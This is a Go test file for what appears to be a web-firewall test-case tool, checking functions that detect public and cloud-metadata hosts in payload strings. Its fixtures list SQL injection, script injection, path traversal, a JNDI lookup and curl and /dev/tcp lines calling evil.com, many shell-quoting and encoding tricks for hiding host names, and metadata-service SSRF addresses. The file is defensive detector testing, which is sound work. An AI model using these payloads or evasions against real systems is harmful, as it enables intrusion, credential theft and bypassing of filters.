package cases

import (
	"bytes"
	"reflect"
	"strings"
	"testing"
)

func TestLinesRoundTrip(t *testing.T) {
	t.Parallel()
	binary := line()
	binary.Source, binary.SourceCaseID = "b", "b-1"
	binary.PayloadBase64 = "/wA=" // not valid UTF-8
	binary.BodyBase64 = "gA=="
	binary.Placement, binary.Encoder = "body", "plain"

	textual := line()
	textual.Payload, textual.Placement = "1' OR '1'='1", "query"
	other := textual
	other.Source, other.SourceCaseID, other.Payload = "c", "c-9", "OR 1=1"
	headers := line()
	headers.SourceCaseID = "a-2"
	headers.Headers = map[string]string{"X-Note": "v"}
	headers.ContentType = "text/plain"
	headers.Body = "plain body"
	bare := line()
	bare.SourceCaseID = "a-3"
	bare.Query = nil
	bare.RawQuery = "a=%ZZ&b"

	var all []Case
	for _, l := range []Line{binary, textual, other, headers, bare} {
		all = append(all, mustCase(t, l))
	}
	merged, conflicts := Merge(all)
	if len(conflicts) != 0 || len(merged) != 4 {
		t.Fatalf("fixture: %d merged, %d conflicts", len(merged), len(conflicts))
	}
	for _, c := range merged {
		ls := Lines(c)
		want := max(len(c.Payloads), 1) * len(c.Sources)
		if len(ls) != want {
			t.Errorf("case %s: %d lines, want %d", c.ID[:8], len(ls), want)
		}
		var buf bytes.Buffer
		if err := WriteLines(&buf, ls); err != nil {
			t.Fatalf("case %s: WriteLines: %v", c.ID[:8], err)
		}
		read, err := ReadLines(&buf)
		if err != nil {
			t.Fatal(err)
		}
		var back []Case
		for _, l := range read {
			back = append(back, mustCase(t, l))
		}
		again, conflicts := Merge(back)
		if len(conflicts) != 0 || len(again) != 1 {
			t.Fatalf("case %s: re-merged into %d cases, %d conflicts", c.ID[:8], len(again), len(conflicts))
		}
		if !reflect.DeepEqual(again[0], c) {
			t.Errorf("case %s does not round-trip:\n got %+v\nwant %+v", c.ID[:8], again[0], c)
		}
	}
}

func TestNamesPublicHost(t *testing.T) {
	t.Parallel()
	public := []string{
		"curl abc.oastify.com",
		"/dev/tcp/198.51.100.7/80",
		"ping 8.8.8.8",
		"ping 8.8.8.8:53",
		"www.google.com",
		"WWW.GOOGLE.COM.",
		"mail root@mail.example.org now",
		"[2001:db8::1]",
		"host 2001:db8::1 here",
		"http://evil.com/",
		"${jndi:ldap://evil.com/a}",
		"%77%77%77%2egoogle%2ecom",
		"www&period;google&period;com",
		"ｗｗｗ．ｇｏｏｇｌｅ．ｃｏｍ",
		"${lower:e}vil.com",
		"nslookup bücher.example",
		"ping 0x08080808",
		// Short IPv4 forms inet_aton reads.
		"ping 1.1",
		"ping 9.9",
		"ping 2.25",
		"ping 2.2.2",
		"ping 8.8.2056",
		"ping 8.526344",
		"ping 1.16843009",
		"ping 1.0x10101",
		"ping -c1 1.1",
		"price 1.5 or 2.25",
		"ping 169.254''.1.1",
		// Hosts split by shell quoting and escaping.
		"curl evil''.com",
		"curl 'evil'.com",
		`curl evil\.com`,
		`curl evil"".com`,
		"curl evil'.'com",
		`curl evil"."com`,
		"curl evil${x}.com",
		"curl evil$x.com",
		"curl evil$@.com",
		"curl evil$*.com",
		"curl evil``.com",
		"curl evil$().com",
		"curl `echo evil`.com",
		"curl ev^il.com",
		"curl $'evil'.com",
		"curl evil\\\n.com",
		"nslookup evil''.com",
		"ping 8''.8.8.8",
		"ping 1.1.1''.1",
		"curl evil%27%27.com",
		"curl ev%5Cil.com",
		"curl ${x:-e}vil.com",
		"ping${IFS}8''.8.8.8",
		"curl evil$1.com",
		"curl %22evil%22%2E%22com%22",
		// Parameter expansions that can expand to nothing.
		"curl evil${x:+}.com",
		"curl evil${x:=}.com",
		"curl evil${!x}.com",
		"curl evil${x[0]}.com",
		"curl evil${x:0:0}.com",
		"curl evil${x%y}.com",
		"curl evil${#x}.com",
		"curl evil${x:-${y:-}}.com",
		// Quotes and shell syntax written as HTML entities.
		"curl evil&apos;&apos;.com",
		"curl evil&quot;&quot;.com",
		"curl evil&grave;&grave;.com",
		"curl evil&dollar;&lcub;x&rcub;.com",
		"curl evil&dollar;&lpar;&rpar;.com",
		// ANSI-C quoting.
		`curl evil$'\56'com`,
		`curl evil$'\x2e'com`,
		`curl evil$'\u002e'com`,
		`curl evil$'\U0000002e'com`,
		// cmd.exe variables.
		"curl evil%x%.com",
		"curl evil%x:~0,0%.com",
	}
	for _, s := range public {
		if !NamesPublicHost(s) {
			t.Errorf("NamesPublicHost(%q) = false, want true", s)
		}
	}
	local := []string{
		"",
		"1' OR '1'='1",
		"<script>alert(1)</script>",
		"../../etc/passwd",
		"${jndi:ldap://callback.invalid/a}",
		"http://127.0.0.1/",
		"ping 127.0.0.1",
		"ping 10.0.0.1",
		"[::1]",
		"listen on ::",
		"std::cout",
		"ping localhost",
		"waf.example.test",
		"cat /etc/hosts.conf",
		"see index.html",
		"arr[1]",
		"version 10.2",
		// Short forms that read as local addresses only.
		"ping 10.1",
		"ping 127.1",
		"ping 192.168.1",
		"ping 0.0",
		// Shell quoting around local hosts.
		"curl 'callback'.invalid",
		"curl waf''.example.test",
		"curl printer''.local",
		// A split whose parts also read as local addresses. (A split that
		// leaves a part like 169.254, itself a public short form, is
		// refused.)
		"ping 10.0.0''.1",
		"ping 169.254.1''.1",
		"ping 192.168.1''.1",
		"${jndi:ldap://callback.invalid/a}",
		"${jndi:ldap://${x}callback.invalid/a}",
		`echo '${x}' "$@"`,
		"curl waf${x:+}.example.test",
		"curl printer${!x}.local",
		"set %PATH% and %x:~0,2%",
		"it&apos;s &quot;fine&quot;",
		`printf $'\56\n'`,
		"${x:0:2} ${#x} ${x%y}",
	}
	for _, s := range local {
		if NamesPublicHost(s) {
			t.Errorf("NamesPublicHost(%q) = true, want false", s)
		}
	}
}

func TestNamesInternalHost(t *testing.T) {
	t.Parallel()
	internal := []string{
		// Link-local IPv4, in every notation the public-host check reads.
		"169.254.169.254",
		"curl http://169.254.169.254/latest/meta-data/",
		"http://169.254.169.254:80/",
		"ping 169.254.0.1",
		"ping 169.254.255.255",
		"169.254.43518",       // three parts
		"169.16689662",        // two parts
		"2852039166",          // one decimal number
		"0xA9FEA9FE",          // one hexadecimal number
		"0xa9.0xfe.0xa9.0xfe", // hexadecimal parts
		"0251.0376.0251.0376", // octal parts
		"0169.0254.0169.0254", // leading zeros read as decimal
		"http://0251.0376.0251.0376/",
		// Split by quotes and shell syntax, or encoded.
		"ping 169.254''.169.254",
		"ping 169.254.1''.1",
		`curl 169.254."169".254`,
		"curl 169.254.'169'.254",
		`curl 169\.254.169.254`,
		"curl 169.254${x}.169.254",
		"169%2e254%2e169%2e254",
		"http://%31%36%39.254.169.254/",
		"&#49;&#54;&#57;.254.169.254",
		"１６９．２５４．１６９．２５４",
		// Link-local IPv6, bracketed or bare, and mapped IPv4.
		"[fe80::1]",
		"http://[fe80::a9fe:a9fe]/",
		"fe80::1%eth0",
		"ping6 febf::1",
		"[::ffff:169.254.169.254]",
		"http://[::ffff:a9fe:a9fe]/",
		"fe''80::1",
		// Known cloud metadata addresses and names.
		"fd00:ec2::254",
		"http://[fd00:ec2::254]/latest/meta-data/",
		"168.63.129.16",
		"100.100.100.200",
		"http://100.100.100.200/latest/meta-data/",
		"192.0.0.192",
		"metadata.google.internal",
		"METADATA.Google.Internal.",
		"curl -H Metadata-Flavor:Google http://metadata.google.internal/computeMetadata/v1/",
		"metadata.goog",
		"meta''data.google.internal",
		"http://instance-data/latest/",
		"instance-data.ec2.internal",
		"metadata.tencentyun.com",
	}
	for _, s := range internal {
		if !NamesInternalHost(s) {
			t.Errorf("NamesInternalHost(%q) = false, want true", s)
		}
	}
	other := []string{
		"",
		"1' OR '1'='1",
		"http://127.0.0.1/admin",
		"ping 127.0.0.1",
		"ping 10.0.0.1",
		"http://192.168.1.1/",
		"[::1]",
		"[fc00::1]",
		"fec0::1",
		"ping 169.253.255.255",
		"ping 169.255.0.0",
		"ping 8.8.8.8",
		"http://localhost/",
		"metadata",
		"google.internal",
		"the instance data",
		"version 1.2.3",
		"price 2.25",
		"fd00:ec2::253",
	}
	for _, s := range other {
		if NamesInternalHost(s) {
			t.Errorf("NamesInternalHost(%q) = true, want false", s)
		}
	}
}

func TestNamesPublicHostTruncatedShellSyntax(t *testing.T) {
	t.Parallel()
	for _, s := range []string{"$", "\\", "${", "${a", "${a:", "${a:-", "${a-b", "${}", "$(", "a$", "a\\", "${a}}", "${a:-}"} {
		NamesPublicHost(s) // must not panic
		NamesPublicHost("x " + s + " y")
	}
	for _, s := range []string{"$'", "$'\\", "$'\\x", "$'\\u12", "%x", "%x:", "${a${", "${!", "${#}"} {
		NamesPublicHost(s)
	}
	// Past its budget it refuses: deep nesting costs a view per level.
	if !NamesPublicHost(strings.Repeat("${a:-", 1000) + "x" + strings.Repeat("}", 1000)) {
		t.Error("deeply nested defaults were not refused")
	}
}
